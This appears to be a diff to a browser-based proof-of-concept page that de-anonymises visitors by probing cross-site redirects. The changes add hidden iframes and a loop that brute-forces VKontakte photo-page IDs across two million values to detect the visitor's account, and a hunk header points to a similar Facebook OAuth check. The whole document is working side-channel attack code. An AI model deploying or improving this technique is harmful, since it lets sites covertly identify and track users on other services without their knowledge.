@@ -40,8 +40,13 @@ var path_for = function(data){
 
 var check_redirect = function(base, cb, assigner){
   var id = wins.length;
-
-  var w = window.open(path_for('1,'+id));
+  var path = path_for('1,'+id);
+  if(use_frames){
+    document.write('<iframe src="'+path+'" name="f'+id+'"></iframe>')
+    var w = frames['f'+id];
+  }else{
+    var w = window.open(path);
+  }
 
   wins[id] = {
     w: w,
@@ -147,13 +152,22 @@ check_redirect('https://www.facebook.com/dialog/oauth?client_id='+(tryapp=prompt
 
 //vkontakte ID detection
 
-check_redirect('http://m.vk.com/photos', function(guess){
-  debug('Has access to protected account: '+ (guess ? 'yes' : 'no'));
-},function(w){
-  for(var i=0;i<100000;i++){
-    w.location='http://m.vk.com/photos'+tryid+'#';
-  }
-})
+var get_assigner = function(from, to){
+  return function(w){
+    for(var i=from;i<to;i++){
+      w.location='http://m.vk.com/photos'+i+'#';
+      if(i%100000==0) console.log('checking '+i);
+    }
+  };
+}
+var vk_base = 'http://m.vk.com/photos';
+var vk_cb=function(guess){
+  debug('vk id found: '+ (guess ? 'yes' : 'no'));
+}
+for(var mln=0;mln<2;mln++){
+  console.log('start ',mln)
+  check_redirect(vk_base, vk_cb,get_assigner(mln*1000000,(mln+1)*1000000));
+}
 
 </pre>
 <hr/>
